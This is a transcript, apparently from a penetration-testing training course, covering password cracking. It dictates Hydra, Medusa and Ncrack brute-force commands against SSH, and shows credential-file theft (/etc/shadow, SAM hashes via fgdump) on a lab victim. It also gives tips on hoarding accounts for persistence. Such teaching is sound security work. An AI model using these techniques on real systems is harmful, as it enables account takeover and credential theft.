like.\n\n513\n00:25:40.743 --> 00:25:44.360\nHit decrypt, and we're done.\n\n514\n00:25:45.860 --> 00:25:47.830\nSo that's a fun way to crack passwords,\nright?\n\n515\n00:25:47.830 --> 00:25:49.645\nOnline, just go and do it online.\n\n516\n00:25:49.645 --> 00:25:50.270\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n517\n00:25:50.270 --> 00:25:53.650\nif you don't have the tool installed\nas long as you can grab that,\n\n518\n00:25:53.650 --> 00:25:55.990\nif you had to manually type it in.\n\n519\n00:25:55.990 --> 00:25:56.770\nI know, that's a pain.\n\n520\n00:25:56.770 --> 00:25:59.640\nBut you can type it in, I've had to do it.\n\n521\n00:25:59.640 --> 00:26:01.010\nBecause I couldn't care,this was in a VM.\n\n522\n00:26:01.010 --> 00:26:03.840\nIt was locked down,\nI couldn't do it, had to type it in.\n\n523\n00:26:03.840 --> 00:26:07.760\nAnd there you go they'll crack that for\nyou cuz it's already been cracked.\n\n524\n00:26:07.760 --> 00:26:11.365\n&gt;&gt; Yeah, that's the thing a lot of people,\nmaybe are confused with that.\n\n525\n00:26:11.365 --> 00:26:14.952\nYou know when you look at a rainbow table,\npasswords are stored as hashes.\n\n526\n00:26:14.952 --> 00:26:18.815\nHashes are fixed length, which means\nno matter what you put into it,\n\n527\n00:26:18.815 --> 00:26:23.690\ntwo characters or 2,500 characters,\nthey always come out with the same Length.\n\n528\n00:26:23.690 --> 00:26:26.850\nThe hash value always has\nthe same number of characters.\n\n529\n00:26:26.850 --> 00:26:28.670\nSo what that means is we get collisions.\n\n530\n00:26:28.670 --> 00:26:32.390\nThe smaller that space is, the fewer\ncharacters of that hashing algorithm\n\n531\n00:26:32.390 --> 00:26:34.440\noutputs, the more collisions we have.\n\n532\n00:26:34.440 --> 00:26:37.670\nThat means more than one thing\nthat are fed into the algorithm,\n\n533\n00:26:37.670 --> 00:26:40.190\ncan end up generating the same hash value.\n\n534\n00:26:40.190 --> 00:26:44.660\nAnd what people sometimes forget is I\ndon't need to know what your password is.\n\n535\n00:26:44.660 --> 00:26:49.980\nI need to know something that generates\nthe same hash value as your password does,\n\n536\n00:26:49.980 --> 00:26:53.370\nbecause as long as it generates that hash\nvalue that's what gets sent over and\n\n537\n00:26:53.370 --> 00:26:56.660\ncompared in whatever security\ndatabase you're using to authenticate\n\n538\n00:26:56.660 --> 00:26:57.980\nlike Active Directory.\n\n539\n00:26:57.980 --> 00:27:01.940\nSo these rainbow tables as Daniel\nsaid just taking hundreds of\n\n540\n00:27:01.940 --> 00:27:05.440\nthousands of millions of words,\nrun them through these hashing algorithms,\n\n541\n00:27:05.440 --> 00:27:09.290\ngenerated their output, you tell them hey,\nhere's the output that my password or\n\n542\n00:27:09.290 --> 00:27:12.170\nthat I've stolen from\nthis security database.\n\n543\n00:27:12.170 --> 00:27:15.495\nYou have anything that generate this and\nthey look through the rainbow table and\n\n544\n00:27:15.495 --> 00:27:18.855\nthey say yeah this word will\ngenerate that exact same hash value.\n\n545\n00:27:18.855 --> 00:27:22.835\nAnd boom, I don't have your password but\nit doesn't matter.\n\n546\n00:27:22.835 --> 00:27:24.655\nI've got something to\ngenerate the same hash value.\n\n547\n00:27:24.655 --> 00:27:27.935\n&gt;&gt; Exactly, so there you go just\nlike Mike said it doesn't matter\n\n548\n00:27:27.935 --> 00:27:29.755\nI don't have your password per say.\n\n549\n00:27:29.755 --> 00:27:34.430\nAs long as the hashes are the same and\nthey equal each other that will work so\n\n550\n00:27:34.430 --> 00:27:37.015\nvery cool that that's online for\nus and then we have tools we\n\n551\n00:27:37.015 --> 00:27:41.970\nbuilt-in to a Kali Linux and things so\nyou'd need to get familiar with them,\n\n552\n00:27:41.970 --> 00:27:45.750\nlike I said John's a good one, I do like\nonline stuff just because I don't have to\n\n553\n00:27:45.750 --> 00:27:49.770\ninstall anything and go through that\npain in the neck, let them do it for me.\n\n554\n00:27:49.770 --> 00:27:54.400\nAlright so let's move on to what\nI call online brute forcing and\n\n555\n00:27:54.400 --> 00:27:58.420\nwhat I mean by that is not that there's a\nservice online that will do stuff for you.\n\n556\n00:27:58.420 --> 00:28:03.360\nMaybe there is I don't know but\nwhat I am talking about\n\n557\n00:28:03.360 --> 00:28:07.980\nis we're going to brute\nforce an online service.\n\n558\n00:28:07.980 --> 00:28:12.260\nFTP, these things right.\n\n559\n00:28:12.260 --> 00:28:14.800\nWe're going to maybe\nhave a username already.\n\n560\n00:28:14.800 --> 00:28:16.590\nWe have a cracked password.\n\n561\n00:28:16.590 --> 00:28:17.490\nI don't need to.\n\n562\n00:28:17.490 --> 00:28:19.590\nI've enumerated a user.\n\n563\n00:28:19.590 --> 00:28:21.200\nI'm just gonna throw everything\nat the kitchen sink.\n\n564\n00:28:21.200 --> 00:28:24.490\nThere's a few tools we can use to do that.\n\n565\n00:28:25.590 --> 00:28:31.430\nWe have Hydra, Medusa, in crack,\nwhich is part of the in maps suite.\n\n566\n00:28:31.430 --> 00:28:33.920\nVery nice, and all of them will do this.\n\n567\n00:28:33.920 --> 00:28:36.060\nI will show you how to use each of them.\n\n568\n00:28:36.060 --> 00:28:37.770\nWe're going to go after SSH.\n\n569\n00:28:40.650 --> 00:28:43.490\nIf you like one versus the other you can\nuse that, I just wanna give you that.\n\n570\n00:28:43.490 --> 00:28:45.530\nAll right let's do that really quickly.\n\n571\n00:28:45.530 --> 00:28:49.700\nLet's, so I'm,\nlet me make sure I'm running SSH here.\n\n572\n00:28:49.700 --> 00:28:58.451\nSo I'm gonna say systemctl ssht start.\n\n573\n00:29:00.500 --> 00:29:01.220\nIs it just SSH.\n\n574\n00:29:03.980 --> 00:29:05.150\nNo what am I doing here?\n\n575\n00:29:05.150 --> 00:29:06.629\nWhat's the problem here?\n\n576\n00:29:06.629 --> 00:29:12.592\nLet me make sure I'm running SSH into 127.\n\n577\n00:29:12.592 --> 00:29:14.480\nYeah so it's happening.\n\n578\n00:29:14.480 --> 00:29:15.800\nSo Ctrl+ C that.\n\n579\n00:29:15.800 --> 00:29:17.490\nMy SSH is running I\ndon't have to start it.\n\n580\n00:29:17.490 --> 00:29:19.670\nNo we're not having any problem here.\n\n581\n00:29:19.670 --> 00:29:23.440\nSo I'm gonna brute force\nmy own user account here.\n\n582\n00:29:23.440 --> 00:29:27.371\nNot the root user account, but another\nuser account that I have for FTPing and\n\n583\n00:29:27.371 --> 00:29:28.589\npurposes such as that.\n\n584\n00:29:28.589 --> 00:29:32.317\nLet's do, let's start with Hydra.\n\n585\n00:29:32.317 --> 00:29:37.550\nSo you do H-Y-D-R-A hydra-l that's for\n\n586\n00:29:37.550 --> 00:29:42.790\nthe user ftp2, is my user account, dash p.\n\n587\n00:29:43.950 --> 00:29:47.650\nAnd then as you're gonna give it\nthe password file that you wanna try to,\n\n588\n00:29:47.650 --> 00:29:49.360\nbasically a dictionary file.\n\n589\n00:29:49.360 --> 00:29:52.150\nI'm gonna use the rock view.text, and\n\n590\n00:29:52.150 --> 00:29:56.495\nthen what your SSH server is, so\nI'm just using the loop back here.\n\n591\n00:29:56.495 --> 00:30:01.180\nOne and then saying SSH because\nit does other services as well so\n\n592\n00:30:01.180 --> 00:30:04.650\nyou have to specify attack SSH.\n\n593\n00:30:04.650 --> 00:30:08.690\nHit Return, it cranks away,\nit churns and burns, it's trying,\n\n594\n00:30:08.690 --> 00:30:10.570\nit's trying, it's trying.\n\n595\n00:30:10.570 --> 00:30:13.277\nLet's see here.\nIt's going for broke.\n\n596\n00:30:13.277 --> 00:30:15.780\nWarning, restore file,\nhardware is restore.\n\n597\n00:30:16.940 --> 00:30:17.550\nAttacking service.\n\n598\n00:30:17.550 --> 00:30:20.270\nThere we go.\nIt's starting to attack the service.\n\n599\n00:30:20.270 --> 00:30:21.710\nIt's taking a little while.\n\n600\n00:30:21.710 --> 00:30:23.960\n&gt;&gt; Actually is a really nice feature,\nthough, the way it says hey,\n\n601\n00:30:23.960 --> 00:30:26.990\nI'll continue on because these\nattacks can take a long time.\n\n602\n00:30:26.990 --> 00:30:30.397\nIt might run it for\na few hours then have to shut down,\n\n603\n00:30:30.397 --> 00:30:32.880\nhave to move, hide, [LAUGH] you know.\n\n604\n00:30:32.880 --> 00:30:33.918\n&gt;&gt; Yeah.\n\n605\n00:30:33.918 --> 00:30:37.330\n&gt;&gt; And what hydra will do is\nactually just pick up where I left\n\n606\n00:30:37.330 --> 00:30:40.320\noff in that previous attack, you don't\nhave to start over, which is really nice.\n\n607\n00:30:40.320 --> 00:30:44.270\n&gt;&gt; Yeah, that's always a nice feature,\nthat if I had to pause this,\n\n608\n00:30:44.270 --> 00:30:46.060\nI can just jump back\nright where I started.\n\n609\n00:30:46.060 --> 00:30:47.890\nNot wait the three hours\nI've already waited\n\n610\n00:30:47.890 --> 00:30:48.432\n&gt;&gt; Yes.\n\n611\n00:30:48.432 --> 00:30:50.340\n[LAUGH]\n&gt;&gt; To get back to where I was.\n\n612\n00:30:50.340 --> 00:30:54.590\nNow, I'm using rockyou.txt and I did that\npurposefully, because to show you that\n\n613\n00:30:54.590 --> 00:30:59.740\nit's gonna take a little bit of time,\nI'm gonna move this over just a hair so\n\n614\n00:30:59.740 --> 00:31:03.420\nI'll bring it right up to my head, so\nI can get a little more real estate.\n\n615\n00:31:03.420 --> 00:31:05.190\nAnd we'll try the others\nwhile that one's working.\n\n616\n00:31:05.190 --> 00:31:08.560\nI've created my own other dictionary file.\n\n617\n00:31:08.560 --> 00:31:14.450\nI'll give you a look at that here,\ncd to Password_Stuff,\n\n618\n00:31:14.450 --> 00:31:17.740\nit is called, word.txt right there.\n\n619\n00:31:17.740 --> 00:31:22.150\nSo if we cat word.txt,\nI've just got a few passwords in here.\n\n620\n00:31:22.150 --> 00:31:25.410\nA couple of permutations\nof the word password.\n\n621\n00:31:25.410 --> 00:31:26.940\nOne of them is the actual password.\n\n622\n00:31:26.940 --> 00:31:30.470\nBut, for intense of a demonstration,\nI just wanna guys skip through this and\n\n623\n00:31:30.470 --> 00:31:32.630\nnot wait for this to take forever.\n\n624\n00:31:32.630 --> 00:31:33.400\n&gt;&gt; We appreciate that.\n\n625\n00:31:33.400 --> 00:31:34.070\n&gt;&gt; Yeah, no problem.\n\n626\n00:31:34.070 --> 00:31:35.275\nSo let's try Medusa.\n\n627\n00:31:35.275 --> 00:31:36.633\nM-e-d-u-s-a.\n\n628\n00:31:36.633 --> 00:31:43.900\nSay -h and\nthen we'll say 127.0.0.1 -u for user.\n\n629\n00:31:43.900 --> 00:31:47.990\nSo the host is whatever the IP address is,\nor the URL name.\n\n630\n00:31:47.990 --> 00:31:54.245\nAnd then the user is ftp2 and\nthen -P yet again.\n\n631\n00:31:54.245 --> 00:31:59.850\nBut we're gonna use word.text and then -m.\n\n632\n00:31:59.850 --> 00:32:04.192\nWhich is ssh, so it's,\nwhat module do you wish to use?\n\n633\n00:32:04.192 --> 00:32:08.484\nYou give that a shot, and it did find the\npassword, but it's failed at establishing\n\n634\n00:32:08.484 --> 00:32:12.546\na connection, probably cuz it's being\nbrute forced out of its mind right now.\n\n635\n00:32:12.546 --> 00:32:15.626\n&gt;&gt; [LAUGH]\n&gt;&gt; But it did find the password,\n\n636\n00:32:15.626 --> 00:32:18.450\nas we saw up there a little bit higher.\n\n637\n00:32:18.450 --> 00:32:19.650\nMaybe I saw it here.\n\n638\n00:32:19.650 --> 00:32:21.880\nThere it is, right there.\n\n639\n00:32:21.880 --> 00:32:27.880\nSo now the credentials have been added\nto the end of the queue for testing.\n\n640\n00:32:27.880 --> 00:32:30.155\nSo when it gets a chance\nyou can try that again.\n\n641\n00:32:30.155 --> 00:32:32.710\nTo do that and will do the same thing.\n\n642\n00:32:32.710 --> 00:32:36.290\nMan this things taking forever,\nthat is a huge list that rockyou.text.\n\n643\n00:32:36.290 --> 00:32:40.790\nI'm actually gonna Ctrl+C it's close.\n\n644\n00:32:40.790 --> 00:32:41.830\nThere we go.\n\n645\n00:32:41.830 --> 00:32:45.650\nLike Mike said you can type hydro\ndash arch resume at session when\n\n646\n00:32:45.650 --> 00:32:47.460\nyou wanna come back to it.\n\n647\n00:32:47.460 --> 00:32:49.810\nLet's try n crack real quickly here.\n\n648\n00:32:49.810 --> 00:32:55.800\nN crack dash vv for\nvery verbose, dash dash user.\n\n649\n00:32:55.800 --> 00:33:01.541\nFtp2, that's our user name,\ndash capital P for\n\n650\n00:33:01.541 --> 00:33:06.190\nour password file which is word.txt and\n\n651\n00:33:06.190 --> 00:33:10.990\nthen you say SSH:// 27.0.01.\n\n652\n00:33:10.990 --> 00:33:14.495\nAnd there you go,\ndiscovered credentials on SSH password.\n\n653\n00:33:14.495 --> 00:33:17.388\nThere you go, and\nwe have discovered the password.\n\n654\n00:33:17.388 --> 00:33:21.689\nSo, three different tools you can use to\ntry crack passwords, obviously when we\n\n655\n00:33:21.689 --> 00:33:25.673\nused a larger password file it took\na lot longer, it will take a lot longer,\n\n656\n00:33:25.673 --> 00:33:28.772\nwe did not even finish it, so\nI showed you a smaller file for\n\n657\n00:33:28.772 --> 00:33:32.820\ndemonstration of getting that password but\nthat is how you do that.\n\n658\n00:33:32.820 --> 00:33:34.600\nI've got a few more things\nthat I wanna show us,\n\n659\n00:33:34.600 --> 00:33:37.760\nbut I know that we are super\nout of time on this one.\n\n660\n00:33:37.760 --> 00:33:39.940\n&gt;&gt; We are, we are, but\nI couldn't stop you.\n\n661\n00:33:39.940 --> 00:33:44.030\nIt was so good, so all right,\nwell Daniel again, great demonstrations.\n\n662\n00:33:44.030 --> 00:33:46.840\nAs always, we hope everyone out\nthere enjoyed watching this one.\n\n663\n00:33:46.840 --> 00:33:50.410\nRemember, we've got a little bit more to\ndo when it comes to password cracking, so\n\n664\n00:33:50.410 --> 00:33:52.248\nmake sure you join us for\nthe next episode.\n\n665\n00:33:52.248 --> 00:33:54.001\nFor now, signing off for ITProTV.\n\n666\n00:33:54.001 --> 00:33:55.289\nI've been your host Mike Roderick.\n\n667\n00:33:55.289 --> 00:33:56.322\n&gt;&gt; And I'm Daniel Lowrie.\n\n668\n00:33:56.322 --> 00:33:58.621\n&gt;&gt; And we'll see you next time.\n\n669\n00:33:58.621 --> 00:34:04.569\n[MUSIC]\n\n670\n00:34:04.569 --> 00:34:10.040\n&gt;&gt; Thank you for watching ITProTV.\n\n",
          "vimeoId": "202941322"
        },
        {
          "description": "In this episode, Dan and Mike continue their look into password attacks. They look at where passwords are stored in both Linux and Windows, and how to obtain them. They also demonstrate how to perform a passing the hash attack.",
          "length": "1151",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-9-1-2-password_cracking_and_attacks_pt2-020317-PGM.00_18_58_11.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-9-1-2-password_cracking_and_attacks_pt2-020317-PGM.00_18_58_11.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-9-1-2-password_cracking_and_attacks_pt2-020317-PGM.00_18_58_11.Still001-sm.jpg",
          "title": "Password Cracking and Attacks Part 2",
          "transcript": "WEBVTT\n\n1\n00:00:00.250 --> 00:00:01.412\nWelcome to ITProTV.\n\n2\n00:00:01.412 --> 00:00:06.362\nI'm your host, Don Pezet [CROSSTALK]\n\n3\n00:00:06.362 --> 00:00:08.306\n[MUSIC]\n\n4\n00:00:08.306 --> 00:00:12.428\n&gt;&gt; You're watching IT Pro TV.\n\n5\n00:00:12.428 --> 00:00:16.116\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n6\n00:00:16.116 --> 00:00:17.366\nI'm your host, Mike Rodrick.\n\n7\n00:00:17.366 --> 00:00:20.210\nAnd today we're doing penetration testing.\n\n8\n00:00:20.210 --> 00:00:23.935\nAnd in this episode we're actually\ncontinuing on with password attacks and\n\n9\n00:00:23.935 --> 00:00:25.410\npassword cracking.\n\n10\n00:00:25.410 --> 00:00:29.140\nSo we'll just jump right back into it,\nI'll hand it right over to our expert, Mr.\n\n11\n00:00:29.140 --> 00:00:29.770\nDaniel Lowry.\n\n12\n00:00:29.770 --> 00:00:30.860\nWelcome back, Daniel.\n\n13\n00:00:30.860 --> 00:00:32.160\n&gt;&gt; Mike, I'm so glad to be back.\n\n14\n00:00:32.160 --> 00:00:33.950\nYeah, we didn't finish up with passwords.\n\n15\n00:00:33.950 --> 00:00:37.580\nIt's a lot of information when it\ncomes to password attacks, right?\n\n16\n00:00:37.580 --> 00:00:38.160\nBecause, well,\n\n17\n00:00:38.160 --> 00:00:42.670\nit's a main platform that you're going\nto need to be able to do, to work with.\n\n18\n00:00:42.670 --> 00:00:45.890\nSo we talked about using John the Ripper,\nwe talked about dictionary attacks,\n\n19\n00:00:45.890 --> 00:00:50.800\nwe talked about Brute Force attacks,\ncreating password files.\n\n20\n00:00:50.800 --> 00:00:52.620\nA lot of stuff going on.\n\n21\n00:00:52.620 --> 00:00:55.320\nNow, where do we get the passwords from?\n\n22\n00:00:55.320 --> 00:00:58.110\nThat's something you probably\nneed to know, right?\n\n23\n00:00:58.110 --> 00:01:01.210\nIf you don't know where to\ngo to get a password or\n\n24\n00:01:01.210 --> 00:01:05.180\ngrab a password, you're not gonna\nhave a very easy time on cracking it.\n\n25\n00:01:05.180 --> 00:01:06.322\nYou might get away with brute force.\n\n26\n00:01:06.322 --> 00:01:10.840\n&gt;&gt; Yeah, yeah, some of those tools like\nhydra and medusa are really designed to\n\n27\n00:01:10.840 --> 00:01:15.500\nfeed passwords into a form on a webpage or\nsomething like that But the other stuff we\n\n28\n00:01:15.500 --> 00:01:19.980\nshowed, we had the hash values and we were\nworking on a file trying to crack those.\n\n29\n00:01:19.980 --> 00:01:21.530\nSo Daniel, where did you get those files?\n\n30\n00:01:21.530 --> 00:01:22.467\n&gt;&gt; Yeah, that's a great question.\n\n31\n00:01:22.467 --> 00:01:25.320\nSo, it just depends on what\nsystem you're working with.\n\n32\n00:01:25.320 --> 00:01:27.860\nIf you're working in a Linux system,\nyou're gonna run and\n\n33\n00:01:27.860 --> 00:01:30.390\nyou're gonna grab the etc shadow file,\nright?\n\n34\n00:01:30.390 --> 00:01:32.860\nThat's where the encrypted\npasswords are stored.\n\n35\n00:01:32.860 --> 00:01:35.550\nAnd they're only accessible\nby somebody with root or\n\n36\n00:01:35.550 --> 00:01:37.790\nadministrative privileges, all right?\n\n37\n00:01:37.790 --> 00:01:41.380\nIn a Windows environments,\nyou got the SAM file, right?\n\n38\n00:01:41.380 --> 00:01:44.762\nYou've got the LM and\nNT LM harsh, it's Windows.\n\n39\n00:01:44.762 --> 00:01:48.849\nIt's Window stuff,\nthey do Windows things to the password.\n\n40\n00:01:48.849 --> 00:01:52.476\nAnd it's really interesting,\nI gotta give them credit,\n\n41\n00:01:52.476 --> 00:01:57.362\nto be honest with you, whereas in LINUX\nit's just a flat file with information\n\n42\n00:01:57.362 --> 00:02:01.900\nin that's only allowed to be seen\nby the administrative users.\n\n43\n00:02:01.900 --> 00:02:08.014\nIn Windows, they actually load it into\nmemory at starts time, encrypt that.\n\n44\n00:02:08.014 --> 00:02:10.052\nSo, the file's encrypted.\n\n45\n00:02:10.052 --> 00:02:14.688\nThey really put the lockdown on their\npassword hashes cuz they don't want people\n\n46\n00:02:14.688 --> 00:02:17.084\ngrabbing them and hacking them, right?\n\n47\n00:02:17.084 --> 00:02:19.071\nIt's been a problem historically [LAUGH].\n\n48\n00:02:19.071 --> 00:02:21.690\n&gt;&gt; Yeah,\nespecially with the old LAN Manager.\n\n49\n00:02:21.690 --> 00:02:23.240\nThat weak hashing algorithm they used.\n\n50\n00:02:23.240 --> 00:02:25.680\nYou better keep it safe,\ncuz they get it, it's gone.\n\n51\n00:02:25.680 --> 00:02:29.550\n&gt;&gt; Yeah, and now they're bumping it\nup with NTLM and NTLM version 2.\n\n52\n00:02:29.550 --> 00:02:31.770\nThey're trying to be more secure.\n\n53\n00:02:31.770 --> 00:02:34.980\nAnd especially that whole,\nyou cannot go into a Windows system,\n\n54\n00:02:34.980 --> 00:02:39.360\nlog in, even as an administrator, and\ngo I wanna see the password file.\n\n55\n00:02:39.360 --> 00:02:41.958\nIt just says you cannot access that,\nit's being used by the system.\n\n56\n00:02:41.958 --> 00:02:45.660\nBecause it's loaded in the memory,\nyou can't just can't grab it.\n\n57\n00:02:45.660 --> 00:02:47.260\n&gt;&gt; But-\n&gt;&gt; So how do you get it, then?\n\n58\n00:02:47.260 --> 00:02:47.790\n&gt;&gt; Yeah, right?\n\n59\n00:02:47.790 --> 00:02:49.080\nGreat question.\n\n60\n00:02:49.080 --> 00:02:52.850\nIf it's unaccessible even by and\nadministrator, what do you do?\n\n61\n00:02:52.850 --> 00:02:54.275\nHow do you get that?\n\n62\n00:02:54.275 --> 00:02:58.400\nWell, hackers are smart,\nthey're very talented people.\n\n63\n00:02:58.400 --> 00:03:03.780\nAnd some talented person somewhere\ncreated a program that you download\n\n64\n00:03:03.780 --> 00:03:07.520\nto your victim machine, and\nyou can snatch them out of memory.\n\n65\n00:03:09.120 --> 00:03:13.890\nHow that works, voodoo, witchcraft, pick\nyour poison, that's how it works, I guess.\n\n66\n00:03:13.890 --> 00:03:17.650\nAll I know is that I get to reap the\nbenefits of someone's very much hard work.\n\n67\n00:03:17.650 --> 00:03:18.200\nAnd so do you.\n\n68\n00:03:18.200 --> 00:03:19.900\n&gt;&gt; And then there's the old tried and\n\n69\n00:03:19.900 --> 00:03:22.201\ntrue method,\nboot to another operating system, right?\n\n70\n00:03:22.201 --> 00:03:22.987\n&gt;&gt; [LAUGH] Yeah.\n\n71\n00:03:22.987 --> 00:03:27.150\n&gt;&gt; I mean, you get your live Linux disk or\nthumb drive, and boot to that.\n\n72\n00:03:27.150 --> 00:03:28.690\nThen all those files are accessible.\n\n73\n00:03:28.690 --> 00:03:29.870\n&gt;&gt; Yeah, that totally will work.\n\n74\n00:03:29.870 --> 00:03:33.640\nAnd we, Mike and I, we've both had to use\nthat technique as systems administrators.\n\n75\n00:03:33.640 --> 00:03:36.360\nPeople lock themselves out and\nyou don't know what they're password is.\n\n76\n00:03:36.360 --> 00:03:39.408\nSo you use a boot CD,\ngo in there, change the password.\n\n77\n00:03:39.408 --> 00:03:44.940\nMaybe use a technique to get around that,\n\n78\n00:03:44.940 --> 00:03:47.930\nthat it's looking for the password, go\nsomewhere else, something to that effect.\n\n79\n00:03:47.930 --> 00:03:50.720\nBut you have to have physical access to\nthe machine for those attacks to work.\n\n80\n00:03:50.720 --> 00:03:54.080\nWe're talking about I'm\nlogged in remotely,\n\n81\n00:03:54.080 --> 00:03:55.870\nhow do I grab that password, right?\n\n82\n00:03:55.870 --> 00:03:58.220\nSo that's what we're talking right now,\npassword grabbing.\n\n83\n00:03:59.310 --> 00:04:01.370\nCouple of tools that can do this.\n\n84\n00:04:01.370 --> 00:04:02.710\nOne is PW Dump.\n\n85\n00:04:02.710 --> 00:04:06.670\nAnd there is another one called FG Dump.\n\n86\n00:04:06.670 --> 00:04:13.090\nBasically, the same tool, the difference\nis is that one only works locally,\n\n87\n00:04:13.090 --> 00:04:17.870\nthe other one will actually reach across\nthe network if you have privileges, and\n\n88\n00:04:17.870 --> 00:04:19.706\ndo it remotely, right?\n\n89\n00:04:19.706 --> 00:04:23.690\nI'm using FG Dump,\nwhich will work locally as well, so\n\n90\n00:04:23.690 --> 00:04:25.740\nit's kind of like the best of both worlds.\n\n91\n00:04:25.740 --> 00:04:28.410\nSo, I like FG Dump, so let's do that.\n\n92\n00:04:28.410 --> 00:04:33.560\nLet's log into our machine,\nlet's run FG Dump, and see what happens.\n\n93\n00:04:34.800 --> 00:04:36.960\nSo if I go into, let's see here.\n\n94\n00:04:40.650 --> 00:04:42.410\nStart an R desktop session.\n\n95\n00:04:43.430 --> 00:04:47.300\nAnd I'll say -u, which is hacker.\n\n96\n00:04:47.300 --> 00:04:51.950\nIt's the user account I created on that\nmachine so that I could log in using RDP.\n\n97\n00:04:51.950 --> 00:04:58.030\nAnd then I think it's just 192.168.200.\n\n98\n00:04:58.030 --> 00:05:00.230\nI think that should work, there we go.\n\n99\n00:05:00.230 --> 00:05:02.620\nNow we get our DP session, I log in.\n\n100\n00:05:03.640 --> 00:05:05.450\nI say, what's my password?\n\n101\n00:05:07.640 --> 00:05:08.830\nOne, there we go.\n\n102\n00:05:08.830 --> 00:05:12.240\nNow, you might be thinking this user\n\n103\n00:05:12.240 --> 00:05:14.990\nactually has administrative\nprivileges on the machine.\n\n104\n00:05:14.990 --> 00:05:19.260\nSo why would I wanna grab more passwords,\nI'm already an admin in the system?\n\n105\n00:05:19.260 --> 00:05:22.110\nIt never hurts to have another\nway to get into a system.\n\n106\n00:05:22.110 --> 00:05:26.370\nSo if I can crack the Administrator's\npassword as well as any other user that\n\n107\n00:05:26.370 --> 00:05:30.170\nmight be on that system,\nif my hacker guy ever gets found out and\n\n108\n00:05:30.170 --> 00:05:33.980\nthey delete that user, well,\nI just can log in as someone else and\n\n109\n00:05:33.980 --> 00:05:36.550\nthen recreate my account and\nI'm back to the races, right?\n\n110\n00:05:36.550 --> 00:05:38.666\nSo that's a good reason to still do this.\n\n111\n00:05:38.666 --> 00:05:40.356\n&gt;&gt; Yeah.\nYou think about log files and\n\n112\n00:05:40.356 --> 00:05:41.640\naccountability, right?\n\n113\n00:05:41.640 --> 00:05:44.280\nWho did this last night at\nthree o'clock in the morning?\n\n114\n00:05:44.280 --> 00:05:45.362\nWell, Daniel, it looks like you.\n\n115\n00:05:45.362 --> 00:05:46.500\n&gt;&gt; [LAUGH]\n&gt;&gt; And you're like I didn't do it,\n\n116\n00:05:46.500 --> 00:05:48.160\nI swear, I wasn't even here.\n\n117\n00:05:48.160 --> 00:05:50.700\nBut somebody has your password and\ncan log in as you.\n\n118\n00:05:50.700 --> 00:05:52.920\nAnd the log files are all gonna\nshow that it was you that did it.\n\n119\n00:05:52.920 --> 00:05:53.800\n&gt;&gt; That's exactly right,\n\n120\n00:05:53.800 --> 00:05:58.340\nso it's a good reason to want\nto log in as a different user.\n\n121\n00:05:58.340 --> 00:06:00.130\nSo just keep that in mind.\n\n122\n00:06:00.130 --> 00:06:03.258\nLet's see here, [INAUDIBLE].\n\n123\n00:06:03.258 --> 00:06:06.983\nWant to upload the file.\n\n124\n00:06:06.983 --> 00:06:08.273\nI did that already.\n\n125\n00:06:08.273 --> 00:06:11.024\nLet me look in my documents.\n\n126\n00:06:11.024 --> 00:06:14.329\nDid I do that, did I download it?\n\n127\n00:06:14.329 --> 00:06:17.296\nNo.\nMaybe it's under another user,\n\n128\n00:06:17.296 --> 00:06:20.827\nthat's okay we can just download it again.\n\n129\n00:06:20.827 --> 00:06:21.628\nLet me back up.\n\n130\n00:06:21.628 --> 00:06:24.464\nCD dot ls.\n\n131\n00:06:24.464 --> 00:06:25.432\nI cannot type.\n\n132\n00:06:25.432 --> 00:06:26.750\n&gt;&gt; While you're finding that file,\n\n133\n00:06:26.750 --> 00:06:31.090\nanother thing is admins like to use\nthe same password in more than one place.\n\n134\n00:06:31.090 --> 00:06:34.390\nYou might have administrative\naccess on this machine, but\n\n135\n00:06:34.390 --> 00:06:37.110\nmaybe you get a hold of\nan administrative account that has it\n\n136\n00:06:37.110 --> 00:06:39.620\naccess to more than one machine,\nor other locations,\n\n137\n00:06:39.620 --> 00:06:44.170\nor maybe they used that password to\nlog into some other server somewhere.\n\n138\n00:06:44.170 --> 00:06:46.160\nSo as Daniel said,\n\n139\n00:06:46.160 --> 00:06:49.660\nalways collect passwords like\nthey're worth a lot of money.\n\n140\n00:06:49.660 --> 00:06:50.370\n&gt;&gt; Yeah.\n&gt;&gt; Because they are.\n\n141\n00:06:50.370 --> 00:06:50.960\n&gt;&gt; That's right,\n\n142\n00:06:50.960 --> 00:06:56.000\nit never hurts to have a cadre of\nuser accounts that you can log into.\n\n143\n00:06:56.000 --> 00:06:59.440\nAnd like Mike said,\nAdministrator on this machine,\n\n144\n00:06:59.440 --> 00:07:01.170\nmaybe they're an administrator\non this machine as well.\n\n145\n00:07:01.170 --> 00:07:02.575\nMaybe those accounts are the same.\n\n146\n00:07:02.575 --> 00:07:05.410\nSo-\n&gt;&gt; Any passwords I find go straight into\n\n147\n00:07:05.410 --> 00:07:06.840\nmy dictionary file, so\nthat I can always use them.\n\n148\n00:07:06.840 --> 00:07:08.300\n&gt;&gt; You gotta keep that, very good.\n\n149\n00:07:08.300 --> 00:07:09.740\nAll right, so I've found my file here.\n\n150\n00:07:09.740 --> 00:07:11.570\nThere it is, fgdump.\n\n151\n00:07:11.570 --> 00:07:16.700\nAnd I'm gonna serve it up, so\nI'm just mysrvc, [INAUDIBLE]\n\n152\n00:07:16.700 --> 00:07:17.740\nmake sure that's started.\n\n153\n00:07:18.920 --> 00:07:26.477\nI'll go into, hopefully this browser\nwill work with me here, and we'll see.\n\n154\n00:07:26.477 --> 00:07:30.930\n192.168.209.146.\n\n155\n00:07:30.930 --> 00:07:34.607\nAnd we'll say fgdump.exe.\n\n156\n00:07:34.607 --> 00:07:39.244\nAnd if that works, which it should,\nwaiting for that connection.\n\n157\n00:07:39.244 --> 00:07:41.340\n[INAUDIBLE] I typed it in correctly.\n\n158\n00:07:41.340 --> 00:07:44.472\nNotice the browser on this\nclient is a little crazy.\n\n159\n00:07:44.472 --> 00:07:46.050\nLet me close this down.\n\n160\n00:07:46.050 --> 00:07:47.330\nLet's try Chrome.\n\n161\n00:07:47.330 --> 00:07:49.620\nChrome's been working for\nme, come on Chrome.\n\n162\n00:07:50.730 --> 00:07:52.650\nLet's do this, bring you into the game.\n\n163\n00:07:52.650 --> 00:07:53.535\nPut you in the game 